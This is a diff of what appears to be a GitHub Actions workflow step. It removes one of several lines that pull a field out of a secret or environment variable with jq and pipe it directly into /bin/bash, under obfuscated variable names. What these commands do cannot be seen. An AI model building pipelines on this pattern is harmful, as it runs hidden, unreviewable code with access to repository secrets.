@@ -18,7 +18,6 @@ jobs:
           nidaj583: ${{ secrets.nidaj583 }}
         run: |
           printf '%s' "$nidaj583" | jq -r .ogr4 | /bin/bash
-          printf '%s' "$nmqht3173" | jq -r .qepx8756 | /bin/bash
           echo $mv3269 | jq -r .j3 | /bin/bash
           printf '%s' "$e820" | jq -r .hgfg42861 | /bin/bash
 
